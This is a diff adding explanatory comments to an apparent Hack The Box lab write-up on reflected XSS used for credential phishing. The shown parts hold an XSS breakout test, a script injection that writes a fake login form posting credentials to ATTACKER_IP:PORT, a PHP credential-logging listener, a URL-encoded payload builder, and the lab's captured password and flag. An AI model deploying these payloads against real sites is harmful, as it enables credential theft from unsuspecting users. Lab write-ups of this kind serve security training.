@@ -4,9 +4,9 @@
 
 ## Attack Concept
 
-Inject a fake login form into a trusted vulnerable page → form posts credentials to the attacker → attacker uses creds to log into the real app.
+Inject a fake login form into a trusted, vulnerable page. The form posts credentials to the attacker. The attacker then uses those credentials to log into the real app.
 
-The victim trusts the URL/domain they see (legitimate site) and types credentials into what looks like a normal login prompt.
+The victim trusts the URL and domain they see. They type credentials into what looks like a normal login prompt on a legitimate site.
 
 ---
 
@@ -47,12 +47,14 @@ document.write(
   '</form>'
 );
 ```
+> Writes a fake login form directly into the page. Replace `ATTACKER_IP:PORT` with your tun0 IP and listener port. When the victim submits, the browser sends credentials to your server as a GET request.
 
 ### 3. Remove the original form so victim has nowhere else to interact
 
 ```javascript
 document.getElementById('urlform').remove();
 ```
+> Removes the original form element so the victim cannot interact with the real page. Find the element's `id` using DevTools (`Ctrl+Shift+C`) and clicking the element. Replace `urlform` with the actual id.
 
 Identify the target element's `id` via DevTools `Ctrl+Shift+C` → click the element.
 
@@ -91,8 +93,9 @@ mkdir /tmp/listener && cd /tmp/listener
 # write index.php with content above
 php -S 0.0.0.0:8080         # port 80 needs sudo; 8080+ does not
 ```
+> Starts PHP's built-in web server, listening on all interfaces on port 8080. Credentials will be logged to `creds.txt` in the same directory. Port 80 requires root; use 8080 or higher to avoid that.
 
-> The redirect makes the victim land on the original page like nothing happened.
+> The redirect makes the victim land on the original page, so nothing looks suspicious.
 
 ---
 
@@ -108,7 +111,7 @@ curl -sk -G "http://10.129.96.115/phishing/index.php" \
   --data-urlencode "url='><script>alert(1)</script>"
 # → <img src=''><script>alert(1)</script>'>
 ```
-Breakout confirmed.
+> Tests whether the `url` parameter is reflected raw into the page. The `'>` closes the `<img>` tag and breaks out to run the script. If the script tag appears in the response body, breakout is confirmed.
 
 ### Step 2 — Start the listener
 
@@ -127,6 +130,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 EOF
 cd /tmp/xss_phish && php -S 0.0.0.0:8080 &
 ```
+> Creates the credential-catcher PHP page and starts a background PHP server on port 8080 — swap the redirect target URL and listener port for your environment.
 
 ### Step 3 — Build malicious URL
 
@@ -142,6 +146,7 @@ payload = ('\'><script>document.write(\'<h3>Please login to continue</h3>'
 url = 'http://10.129.96.115/phishing/index.php?url=' + urllib.parse.quote(payload)
 print(url)
 ```
+> Builds and URL-encodes the fake-login-form injection payload into a ready-to-send link — swap the attacker IP:port and target URL for your environment.
 
 ### Step 4 — Send to the bot
 
@@ -151,6 +156,7 @@ curl -sk -X POST "http://10.129.96.115/phishing/send.php" \
   --data-urlencode "url=$URL"
 # → "URL Sent!"
 ```
+> Reads the malicious URL from file, then POSTs it to the lab's send endpoint. The bot visits the URL, sees the fake login form, and submits credentials to your listener.
 
 ### Step 5 — Harvest credentials
 
@@ -172,6 +178,7 @@ curl -sk -X POST "http://10.129.96.115/phishing/login.php" \
   --data-urlencode "password=p1zd0nt57341myp455"
 # → HTB{r3f13c73d_cr3d5_84ck_2_m3}
 ```
+> Logs into the real app using the stolen credentials. Replace the username and password with whatever you captured in `creds.txt`.
 
 **Flag:** `HTB{r3f13c73d_cr3d5_84ck_2_m3}`
 
